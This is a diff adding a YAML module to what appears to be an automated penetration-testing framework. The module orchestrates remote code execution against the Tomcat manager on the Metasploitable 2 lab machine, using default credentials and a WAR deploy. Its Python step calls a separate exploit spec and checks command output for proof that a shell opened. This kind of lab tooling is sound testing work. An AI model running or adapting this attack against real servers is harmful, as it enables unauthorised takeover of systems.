@@ -1,0 +1,35 @@
+name: MS2 Tomcat Manager Deploy RCE
+description: >
+  Default Tomcat manager credentials allow deploying a WAR for remote code execution.
+  Delegates to the framework's verified exploit spec (exploits/ms2_tomcat_manager.yaml)
+  through run_spec, which drives the persistent target session.
+platforms:
+- linux
+scenario: metasploitable
+vector: ms2_tomcat_manager
+mitre: T1190
+trigger:
+- http-proxy
+- http
+steps:
+- kind: lazymode
+  lang: python
+  timeout: 240
+  run: |
+    import re
+
+    from modules.atomic_exploit_bridge import load_all, run_spec
+
+    result = {"target": target, "vector": "ms2_tomcat_manager"}
+    spec = load_all().get("ms2_tomcat_manager")
+    if spec is None:
+        result["session_opened"] = False
+        result["error"] = "exploit spec ms2_tomcat_manager not found in exploits/"
+    else:
+        outcome = run_spec(spec, rhost=target)
+        blob = outcome.get("output") or ""
+        match = re.search(r"uid=\d+\([^)]*\)[^\n]*", blob)
+        result["cve"] = spec.cve
+        result["session_opened"] = bool(outcome.get("shell"))
+        result["success"] = bool(outcome.get("success"))
+        result["proof"] = (match.group(0).strip() if match else blob[-300:].strip()) or "(no proof)"
